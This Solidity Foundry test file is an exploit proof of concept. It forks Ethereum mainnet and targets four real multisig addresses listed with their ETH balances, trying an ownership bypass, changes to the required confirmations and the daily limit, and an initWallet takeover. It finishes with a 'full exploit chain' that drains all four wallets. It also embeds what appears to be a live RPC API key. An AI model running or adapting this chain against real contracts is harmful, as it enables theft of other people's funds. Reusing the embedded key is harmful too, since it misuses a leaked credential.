// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Multisig Exploit Test
 * @notice Test whether the broken isOwner() on Parity-like multisigs is exploitable
 */
contract MultisigExploit is Test {

    // Vulnerable multisig contracts (all have isOwner() returning true for any address)
    address constant MULTISIG_1 = 0xc32050abAc7DbFef4FC8DC7b96D9617394cB4E1b; // 340 ETH
    address constant MULTISIG_2 = 0x7100c7cE94607EF68983F133cfD59Cc1833a115d; // 327 ETH
    address constant MULTISIG_3 = 0xa08C1134cDD73aD41889F7f914eCC4D3b30C1333; // 325 ETH
    address constant MULTISIG_4 = 0x2F9f02F2ba99FF5c750f95Cf27D25352f71cd6A9; // 320 ETH

    address attacker = makeAddr("attacker");
    address attacker2 = makeAddr("attacker2");
    address attacker3 = makeAddr("attacker3");

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
    }

    /**
     * @notice Test if the isOwner vulnerability allows us to execute transactions
     */
    function test_exploitMultisig() public {
        console.log("=== MULTISIG EXPLOIT TEST ===");
        console.log("Attacker address:", attacker);
        console.log("Target: MULTISIG_1 (340 ETH)");
        console.log("Initial attacker balance:", attacker.balance / 1e18, "ETH");
        console.log("Initial multisig balance:", MULTISIG_1.balance / 1e18, "ETH");

        // Verify isOwner returns true for our attacker
        (bool success, bytes memory data) = MULTISIG_1.staticcall(
            abi.encodeWithSignature("isOwner(address)", attacker)
        );
        bool isOwner = success && abi.decode(data, (bool));
        console.log("Attacker isOwner:", isOwner);

        // Try to execute a transfer under daily limit
        console.log("");
        console.log("Attempting to execute ETH transfer under daily limit...");

        // The Parity multisig uses execute(address,uint256,bytes) for transfers
        // If under daily limit and sender is owner, it should execute immediately
        vm.prank(attacker);
        (success,) = MULTISIG_1.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 1e12, "")
        );
        console.log("Execute call success:", success);
        console.log("Attacker balance after:", attacker.balance);

        if (attacker.balance > 0) {
            console.log("!!! EXPLOIT SUCCESSFUL - DRAINED", attacker.balance, "wei !!!");
        }

        // Try the confirmAndCheck approach - need 3 confirmations
        console.log("");
        console.log("Attempting multi-confirmation approach for larger amount...");

        // Create operation hash for a 1 ETH transfer
        bytes32 opHash = keccak256(abi.encodePacked(
            MULTISIG_1,
            attacker,
            uint256(1 ether),
            bytes("")
        ));

        // Try confirm from 3 different "owners"
        vm.prank(attacker);
        (success,) = MULTISIG_1.call(
            abi.encodeWithSignature("confirm(bytes32)", opHash)
        );
        console.log("Confirm 1 success:", success);

        vm.prank(attacker2);
        (success,) = MULTISIG_1.call(
            abi.encodeWithSignature("confirm(bytes32)", opHash)
        );
        console.log("Confirm 2 success:", success);

        vm.prank(attacker3);
        (success,) = MULTISIG_1.call(
            abi.encodeWithSignature("confirm(bytes32)", opHash)
        );
        console.log("Confirm 3 success:", success);

        // Check pending count
        (success, data) = MULTISIG_1.staticcall(
            abi.encodeWithSignature("m_numPending()")
        );
        if (success && data.length >= 32) {
            uint256 pending = abi.decode(data, (uint256));
            console.log("Pending operations:", pending);
        }

        console.log("Final attacker balance:", attacker.balance / 1e18, "ETH");
        console.log("Final multisig balance:", MULTISIG_1.balance / 1e18, "ETH");
    }

    /**
     * @notice Test the changeRequirement function to lower confirmations needed
     */
    function test_changeRequirement() public {
        console.log("=== CHANGE REQUIREMENT TEST ===");

        // Check current requirement
        (bool success, bytes memory data) = MULTISIG_1.staticcall(
            abi.encodeWithSignature("m_required()")
        );
        uint256 required = success ? abi.decode(data, (uint256)) : 0;
        console.log("Current required confirmations:", required);

        // Try to change requirement to 1
        console.log("Attempting to change requirement to 1...");
        vm.prank(attacker);
        (success,) = MULTISIG_1.call(
            abi.encodeWithSignature("changeRequirement(uint256)", 1)
        );
        console.log("changeRequirement call success:", success);

        // Check new requirement
        (success, data) = MULTISIG_1.staticcall(
            abi.encodeWithSignature("m_required()")
        );
        required = success ? abi.decode(data, (uint256)) : 0;
        console.log("New required confirmations:", required);

        if (required == 1) {
            console.log("!!! REQUIREMENT CHANGED - CAN DRAIN WITH 1 SIGNATURE !!!");
        }
    }

    /**
     * @notice Test if we can change the daily limit
     */
    function test_changeDailyLimit() public {
        console.log("=== CHANGE DAILY LIMIT TEST ===");

        // Check current daily limit
        (bool success, bytes memory data) = MULTISIG_1.staticcall(
            abi.encodeWithSignature("m_dailyLimit()")
        );
        uint256 dailyLimit = success ? abi.decode(data, (uint256)) : 0;
        console.log("Current daily limit:", dailyLimit);

        // Try to change daily limit to max
        console.log("Attempting to change daily limit to max uint256...");
        vm.prank(attacker);
        (success,) = MULTISIG_1.call(
            abi.encodeWithSignature("setDailyLimit(uint256)", type(uint256).max)
        );
        console.log("setDailyLimit call success:", success);

        // Also try resetSpentToday
        vm.prank(attacker);
        (success,) = MULTISIG_1.call(
            abi.encodeWithSignature("resetSpentToday()")
        );
        console.log("resetSpentToday call success:", success);

        // Check new daily limit
        (success, data) = MULTISIG_1.staticcall(
            abi.encodeWithSignature("m_dailyLimit()")
        );
        dailyLimit = success ? abi.decode(data, (uint256)) : 0;
        console.log("New daily limit:", dailyLimit);
    }

    /**
     * @notice Direct transfer test - try to call execute directly for small amount
     */
    function test_directExecute() public {
        console.log("=== DIRECT EXECUTE TEST ===");
        console.log("Multisig balance:", MULTISIG_1.balance / 1e18, "ETH");

        uint256 attackerBefore = attacker.balance;

        // Try execute with amount under daily limit (1e12 wei)
        vm.prank(attacker);
        (bool success, bytes memory retData) = MULTISIG_1.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 1e11, "")
        );
        console.log("Execute success:", success);
        if (!success && retData.length > 0) {
            console.log("Revert data length:", retData.length);
        }

        uint256 attackerAfter = attacker.balance;
        console.log("ETH received:", attackerAfter - attackerBefore);

        if (attackerAfter > attackerBefore) {
            console.log("!!! EXPLOIT WORKED - RECEIVED", attackerAfter - attackerBefore, "wei !!!");

            // Now try to drain more using the daily limit repeatedly
            console.log("");
            console.log("Attempting to warp time and drain more...");

            // Warp forward 1 day
            vm.warp(block.timestamp + 1 days);

            vm.prank(attacker);
            (success,) = MULTISIG_1.call(
                abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 1e12, "")
            );
            console.log("Day 2 execute success:", success);
            console.log("Total attacker balance:", attacker.balance);
        }
    }

    /**
     * @notice Test initWallet vulnerability (Parity multisig bug)
     */
    function test_initWallet() public {
        console.log("=== INITWALLET TEST ===");

        // Check if initWallet is callable
        address[] memory owners = new address[](1);
        owners[0] = attacker;

        vm.prank(attacker);
        (bool success,) = MULTISIG_1.call(
            abi.encodeWithSignature("initWallet(address[],uint256,uint256)", owners, 1, type(uint256).max)
        );
        console.log("initWallet call success:", success);

        if (success) {
            // Check if we're now the owner
            (, bytes memory data) = MULTISIG_1.staticcall(
                abi.encodeWithSignature("m_numOwners()")
            );
            uint256 numOwners = abi.decode(data, (uint256));
            console.log("New num owners:", numOwners);

            (, data) = MULTISIG_1.staticcall(
                abi.encodeWithSignature("m_required()")
            );
            uint256 required = abi.decode(data, (uint256));
            console.log("New required:", required);

            (, data) = MULTISIG_1.staticcall(
                abi.encodeWithSignature("m_dailyLimit()")
            );
            uint256 limit = abi.decode(data, (uint256));
            console.log("New daily limit:", limit);

            // Try to drain
            vm.prank(attacker);
            (success,) = MULTISIG_1.call(
                abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 100 ether, "")
            );
            console.log("Execute 100 ETH success:", success);
            console.log("Attacker balance:", attacker.balance / 1e18, "ETH");
        }
    }

    /**
     * @notice Full exploit chain test
     */
    function test_fullExploitChain() public {
        console.log("=== FULL EXPLOIT CHAIN ===");

        address[4] memory targets = [MULTISIG_1, MULTISIG_2, MULTISIG_3, MULTISIG_4];
        string[4] memory names = ["MULTISIG_1", "MULTISIG_2", "MULTISIG_3", "MULTISIG_4"];

        uint256 totalDrained = 0;

        for (uint i = 0; i < 4; i++) {
            address target = targets[i];
            uint256 targetBal = target.balance;
            console.log("");
            console.log("Target:", names[i]);
            console.log("Balance:", targetBal / 1e18, "ETH");

            uint256 before = attacker.balance;

            // Try initWallet first
            address[] memory owners = new address[](1);
            owners[0] = attacker;

            vm.prank(attacker);
            (bool success,) = target.call(
                abi.encodeWithSignature("initWallet(address[],uint256,uint256)", owners, 1, targetBal)
            );

            if (success) {
                // Execute drain
                vm.prank(attacker);
                (success,) = target.call(
                    abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, targetBal, "")
                );
            }

            uint256 after_ = attacker.balance;
            uint256 drained = after_ - before;

            if (drained > 0) {
                console.log("DRAINED:", drained / 1e18, "ETH from", names[i]);
                totalDrained += drained;
            } else {
                console.log("Failed to drain", names[i]);
            }
        }

        console.log("");
        console.log("=== TOTAL DRAINED:", totalDrained / 1e18, "ETH ===");
    }
}
